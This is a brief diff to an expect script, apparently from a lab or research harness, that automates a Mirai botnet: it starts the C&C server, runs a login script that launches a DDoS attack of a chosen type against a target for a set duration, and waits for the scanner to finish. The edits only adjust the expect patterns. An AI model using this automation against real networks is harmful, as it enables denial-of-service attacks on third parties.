@@ -42,11 +42,11 @@ expect "*mirai# "
 send "nohup debug/cnc &\r"
 # Login to count bots and run DDoS attack
 #expect "*DB opened"
-expect "output to 'nohup.out'"
+expect "*output to 'nohup.out'"
 send "\r"
 expect "*mirai# "
 send "nohup $path/./$login_sh $numOfNewBots $DDoSType $targetedDDoS $dur $path $CNC_ip &\r"
-expect "output to 'nohup.out'"
+expect "*output to 'nohup.out'"
 send "\r"
 
 # Run listening scanner server
@@ -58,7 +58,7 @@ send "\r"
 # Wait to finish Scanning
 expect "*mirai# "
 send "nohup python3 $path/$waitToFinishScan $path $mirai_path/$scanListenOutput $scanFinishedFile $numOfNewBots $debug_path $input_bot_file &\r"
-expect "output to 'nohup.out'"
+expect "*output to 'nohup.out'"
 send "\r"
 
 expect "*mirai# "
